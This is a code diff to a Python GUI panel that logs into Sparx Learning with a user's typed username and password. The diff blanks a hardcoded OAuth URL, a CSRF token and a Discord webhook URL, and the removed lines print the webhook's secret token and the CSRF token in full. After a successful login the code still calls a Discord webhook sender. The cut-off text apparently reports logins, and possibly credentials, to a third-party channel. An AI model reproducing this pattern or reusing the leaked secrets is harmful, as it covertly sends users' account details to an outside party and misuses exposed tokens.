@@ -104,12 +104,12 @@ class SparxPanel(ctk.CTkFrame):
             self.show_popup("Error", "Please enter both username and password!")
             return
 
-        url = "https://auth.sparx-learning.com/oauth2/auth?client_id=sparx-learning&hd=e40d2d85-34ff-44c4-af8a-fb567c3cef96&p=1&redirect_uri=https%3A%2F%2Fapi.sparx-learning.com%2Foauth2%2Fcallback%2Fsparx&response_type=code&scope=openid+profile+email&state=mzZG4A1IAvuxHrF_b2Vb3cDAJ43cNg1HJyeN1Lc78P9CScnk2QHE2x6OE0sIL9j_EcssX2dvLW-gWQnx40tOj4y28qoN477-Emjn_kqazt5Zz28CBeyohEBRXl4c9QduBFcT4KitiqCS9l7rX2zgW3q_hvmj-Z-ypAqLoG08pUB_SFYlFwgJoflY7tTpCQk77sfiENOoDkerwhTp4emEQgLM3I_ntFvBxIH_P717AfQNamb5kuQNxXR6VFb28AOQ4Qn6tTZgFst81vcta4yPM5Fsb7i6vMCp_mGutUyeF49ghBMPINgBwNSGhP9S&ts=1743708426"
+        url = ""
         
         payload = {
             "username": username,
             "password": password,
-            "gorilla.csrf.Token": "snkMM6KfjQSOZkOOrGtj5BT4FeT/MGyibkV8T2rTREM6Lphlv/Mqpe+SGkwtIvznRhwOz+apbPlCemgAOmRBFA=="
+            "gorilla.csrf.Token": ""
         }
         
         headers = {
@@ -122,7 +122,7 @@ class SparxPanel(ctk.CTkFrame):
                     if response.status == 200:
                         self.show_popup("Success", f"Logged in successfully as {username}!")
                         print(f"Successfully logged in as {username}")
-                        webhook = "https://discord.com/api/webhooks/1357445889249116221/yyDNEXPzJabJXwsXnM1cYaKF48PbXz3XwMzXir5dNWZ2CMl93aPhAp82xcjSSCo0sQjc"
+                        webhook = ""
                         from webhook import WebhookSender
 
                         WebhookSender.send_discord(
